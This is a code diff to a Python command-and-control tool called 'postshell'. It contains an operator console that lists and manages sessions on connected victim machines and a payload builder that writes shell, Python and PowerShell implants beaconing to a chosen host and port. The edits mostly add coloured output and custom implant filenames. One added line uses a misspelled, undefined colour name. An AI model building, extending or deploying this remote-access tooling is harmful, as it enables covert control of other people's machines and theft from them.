@@ -223,14 +223,14 @@ def cli():
     Web Command & Control
 {RESET}
         """)
-    print(f"[+] Server running on port {port}")
+    print(f"{GREEN}[+] Server running on port {ORANGE}{port}{RESET}")
     while True:
         try:
             if not selected_client:
                 cmd = input(f"{BLUE}postshell>{RESET} ").strip()
 
                 if cmd == "exit":
-                    print("[!] Shutting down server and all sessions.")
+                    print(f"{RED}[!] Shutting down server and all sessions.{RESET}")
                     with lock:
                         for cid in list(clients.keys()):
                             client_commands[cid] = "exit"
@@ -241,7 +241,7 @@ def cli():
                 elif cmd == "list":
                     with lock:
                         if not clients:
-                            print("[!] No clients connected.")
+                            print(f"{RED}[!] No clients connected.{RESET}")
                             continue
 
                         headers = ["ID", "IP", "HOSTNAME", "USER", "OS", "VERSION", "ARCH"]
@@ -252,8 +252,8 @@ def cli():
                             data.append([
                                 str(info["num_id"]),
                                 info.get("ip", "N/A"),
-                                info.get("hostname", ""),
                                 user_col,
+                                info.get("hostname", ""),
                                 info.get("os", ""),
                                 info.get("version", ""),
                                 info.get("arch", "")
@@ -267,9 +267,9 @@ def cli():
                         if client_id:
                             selected_client = client_id
                         else:
-                            print("Invalid client ID")
+                            print(f"{RED}[!] Invalid client ID{RESET}")
                     except:
-                        print("Invalid input")
+                        print(f"{RED}[!] Invalid input{RESET}")
 
                 elif cmd.startswith("kill "):
                     try:
@@ -279,11 +279,11 @@ def cli():
                             with lock:
                                 client_commands[client_id] = "exit"
                                 clients.pop(client_id, None)
-                            print(f"[!] Sent kill command to {client_id}")
+                            print(f"{RED}[!] Sent kill command to {client_id}{RESET}")
                         else:
-                            print("Invalid client ID")
+                            print(f"{RED}[!] Invalid client ID{RESET}")
                     except:
-                        print("Invalid input")
+                        print(f"{RED}[!] Invalid input{RESET}")
                 elif cmd == "payload":
                     payload_shell()
                 elif cmd in ["help", "?"]:
@@ -303,7 +303,7 @@ def cli():
                     with lock:
                         client_commands[selected_client] = "exit"
                         clients.pop(selected_client, None)
-                    print(f"[!] Sent die command to {selected_client}")
+                    print(f"{RED}[!] Sent die command to {selected_client}{RESET}")
                     selected_client = None
                 elif cmd:
                     with lock:
@@ -316,32 +316,34 @@ def cli():
                                 print(r)
                             client_results[selected_client].clear()
                         else:
-                            print("[<] No result yet")
+                            print(f"{ORANGE}[<] No result yet{RESET}")
         except KeyboardInterrupt:
             if not selected_client:
-                print("\n[!] Use 'exit' to cleanly shut down the server.")
+                print(f"{RED}\n[!] Use 'exit' to cleanly shut down the server.{RESET}")
             else:
-                print("\n[!] Use 'background' to return or 'die' to terminate the session.")
+                print(f"{RED}\n[!] Use 'background' to return or 'die' to terminate the session.{RESET}")
 ## payload builder
 PAYLOAD_COMMANDS = ["set", "generate", "back", "options", "help"]
 payload_settings = {
+    "name": "",
     "lhost": "127.0.0.1",
     "lport": "80",
     "payload": "sh",
     "checkin": "1"
 }
 
+
 def payload_completer(text, state):
     options = []
     if readline.get_line_buffer().strip().startswith("set"):
-        options = ["set lhost ", "set lport ", "set payload ", "set waittime "]
+        options = ["set lhost ", "set lport ", "set payload ", "set checkin ", "set name "]
     else:
         options = [cmd + " " for cmd in PAYLOAD_COMMANDS if cmd.startswith(text)]
     return options[state] if state < len(options) else None
 
 
 def show_payload_options():
-    print("\nCurrent Payload Options:\n")
+    print(f"{ORANGE}\nCurrent Payload Options:\n{RESET}")
     for key, value in payload_settings.items():
         if value.strip() == "":
             print(f"  {key.upper():10}: {RED}<NOT SET>{RESET}")
@@ -349,9 +351,9 @@ def show_payload_options():
             print(f"  {key.upper():10}: {ORANGE}{value}{RESET}")
     print("")
 
-
 def payload_help():
     print(f"{ORANGE}\nPayload Menu Commands:{RESET}")
+    print(f"    set name <name>     - Set CUSTOM script name | BLANK = DEFAULT")
     print(f"    set lhost <ip>      - Set the POSTSHELL IP address")
     print(f"    set lport <port>    - Set the POSTSHELL listening port")
     print(f"    set payload <type>  - Set payload type (EX: sh, py, ps1)")
@@ -379,22 +381,22 @@ def payload_shell():
                     value = " ".join(parts[2:])
                     if key in payload_settings:
                         payload_settings[key] = value
-                        print(f"[+] Set {key} to {value}")
+                        print(f"{GREEN}[+] Set {ORANGE}'{key}'{GREEN} to {ORANGE}'{value}'{RESET}")
                     else:
-                        print(f"[-] Unknown setting: {key}")
+                        print(f"{RED}[-] Unknown setting: {key}{RESET}")
                 elif len(parts) == 3 and parts[1].lower() == "waittime":
                     try:
                         waittime_value = int(parts[2])
                         payload_settings["checkin"] = waittime_value
-                        print(f"[+] Set WAITTIME to {waittime_value} seconds.")
+                        print(f"{GREEN}[+] Set {ORANGE}'CHECKIN'{GREEN} to {ORANGE}'{waittime_value}' {GREEN}seconds.{RESET}")
                     except ValueError:
-                        print("[-] Invalid value for WAITTIME. Please provide an integer.")
+                        print(f"{RED}[-] Invalid value for 'CHECKIN'. Please provide an integer.{RESET}")
                 else:
-                    print("Usage: set <lhost|lport|payload|waittime> <value>")
+                    print(f"{RED}[!] Usage: set <name|lhost|lport|payload|checkin> <value>{RESET}")
             elif cmd == "generate":
                 generate_payload()
             elif cmd == "back":
-                print("[*] Returning to main menu.")
+                print(f"{ORANGE}[*] Returning to main menu.{RESET}")
                 readline.set_completer(completer)  # Main menu completer
                 readline.parse_and_bind("tab: complete")
                 break
@@ -405,7 +407,7 @@ def payload_shell():
             else:
                 print(f"Unknown command. Type {ORANGE}'help'{RESET} for payload options.")
         except KeyboardInterrupt:
-            print("\n[*] Returning to main menu.")
+            print(f"{ORNAGE}\n[*] Returning to main menu.{RESET}")
             readline.set_completer(completer)  # Main menu completer
             break
         except Exception as e:
@@ -506,10 +508,15 @@ if __name__ == "__main__":
     register_client()
     command_loop()
 '''
-        filename = f"tools/{lhost.replace('.', '_')}_{lport}.py"
+        custom_name = payload_settings.get("name", "").strip()
+        if custom_name:
+            filename = f"tools/{custom_name}.{payload_type}"
+        else:
+            filename = f"tools/{lhost.replace('.', '_')}_{lport}.{payload_type}"
+
         with open(filename, "w") as f:
             f.write(payload_code)
-        print(f"[+] Payload generated and saved as {ORANGE}{filename}{RESET}")
+        print(f"{GREEN}[+] Payload generated and saved as {ORANGE}'{filename}'{RESET}")
 
     
     elif payload_type == "sh":
@@ -546,10 +553,15 @@ while true; do
     sleep $WAITTIME
 done
 """
-        filename = f"tools/{lhost.replace('.', '_')}_{lport}.sh"
+        custom_name = payload_settings.get("name", "").strip()
+        if custom_name:
+            filename = f"tools/{custom_name}.{payload_type}"
+        else:
+            filename = f"tools/{lhost.replace('.', '_')}_{lport}.{payload_type}"
+
         with open(filename, "w") as f:
             f.write(payload_code)
-        print(f"[+] Payload generated and saved as {ORANGE}{filename}{RESET}")
+        print(f"{GREEN}[+] Payload generated and saved as {ORANGE}'{filename}'{RESET}")
 
     elif payload_type == "ps1":
         payload_code = f"""$ServerIP = "{payload_settings['lhost']}"
@@ -615,13 +627,18 @@ while ($true) {{
     Start-Sleep -Seconds $WAITTIME
 }}
 """
-        filename = f"tools/{lhost.replace('.', '_')}_{lport}.ps1"
+        custom_name = payload_settings.get("name", "").strip()
+        if custom_name:
+            filename = f"tools/{custom_name}.{payload_type}"
+        else:
+            filename = f"tools/{lhost.replace('.', '_')}_{lport}.{payload_type}"
+
         with open(filename, "w") as f:
             f.write(payload_code)
-        print(f"[+] Payload generated and saved as {ORANGE}{filename}{RESET}")
+        print(f"{GREEN}[+] Payload generated and saved as {ORANGE}'{filename}'{RESET}")
 
     else:
-        print(f"[-] Payload type '{payload_type}' not implemented yet.")
+        print(f"{RED}[-] Payload type '{payload_type}' not implemented yet.{RESET}")
 
 def start_server(port):
     socketserver.ThreadingTCPServer.allow_reuse_address = True
